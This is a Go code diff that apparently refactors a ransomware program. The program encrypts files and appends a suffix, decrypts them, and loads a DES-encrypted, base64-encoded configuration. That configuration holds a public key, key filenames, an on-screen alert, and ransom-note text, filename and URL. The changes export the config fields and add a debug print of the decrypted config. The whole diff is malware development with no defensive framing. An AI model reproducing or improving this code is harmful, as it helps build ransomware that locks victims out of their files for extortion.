@@ -2,17 +2,18 @@ package main
 
 import (
 	"crypto/cipher"
+	"crypto/des"
+	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"os"
 	"strings"
 	"time"
-	"crypto/des"
-	"encoding/json"
 )
 
 func encrypt(filename string, cip cipher.Block) error {
 
-	if len(filename) >= 1+len(settings.filesuffix) && filename[len(filename)-len(settings.filesuffix):] == settings.filesuffix {
+	if len(filename) >= 1+len(settings.Filesuffix) && filename[len(filename)-len(settings.Filesuffix):] == settings.Filesuffix {
 		return nil
 	}
 
@@ -31,13 +32,13 @@ func encrypt(filename string, cip cipher.Block) error {
 	}
 
 	f.Close()
-	os.Rename(filename, filename+settings.filesuffix)
+	os.Rename(filename, filename+settings.Filesuffix)
 	return nil
 }
 
 func decrypt(filename string, cip cipher.Block) error {
 
-	if len(filename) < 1+len(settings.filesuffix) || filename[len(filename)-len(settings.filesuffix):] != settings.filesuffix {
+	if len(filename) < 1+len(settings.Filesuffix) || filename[len(filename)-len(settings.Filesuffix):] != settings.Filesuffix {
 		return nil
 	}
 	f, err := os.OpenFile(filename, os.O_RDWR, 0)
@@ -54,7 +55,7 @@ func decrypt(filename string, cip cipher.Block) error {
 		f.WriteAt(out, offset)
 	}
 	f.Close()
-	os.Rename(filename, filename[0:len(filename)-len(settings.filesuffix)])
+	os.Rename(filename, filename[0:len(filename)-len(settings.Filesuffix)])
 	return nil
 }
 
@@ -103,33 +104,33 @@ func startHandler(cip cipher.Block, list chan string) {
 
 type Config struct {
 	//加密设置
-	pubKey       string
-	filesuffix   string
-	keyFilename  string
-	dkeyFilename string
+	PubKey       string
+	Filesuffix   string
+	KeyFilename  string
+	DkeyFilename string
 
 	//运行提示设置
-	alert string
+	Alert string
 
 	//readme设置
-	readme         string
-	readmeFilename string
+	Readme         string
+	ReadmeFilename string
 
-	readmeUrl         string
-	readmeNetFilename string
+	ReadmeUrl         string
+	ReadmeNetFilename string
 }
 
 func (self *Config) init(EncData string) {
+	data, _ := base64.StdEncoding.DecodeString(EncData)
 	cip, err := des.NewCipher([]byte(configPw))
 	if err != nil {
 		os.Exit(213)
 	}
 
-	data := make([]byte, len(EncData))
-	Edata := []byte(EncData)
-	for offset := 0; len(Edata)-offset > 8; offset += 8 {
-		cip.Decrypt(data[offset:offset+8], Edata[offset:offset+8])
+	for offset := 0; len(data)-offset > 8; offset += 8 {
+		cip.Decrypt(data[offset:offset+8], data[offset:offset+8])
 	}
+	fmt.Println(string(data))
 
 	json.Unmarshal(data, self)
 }
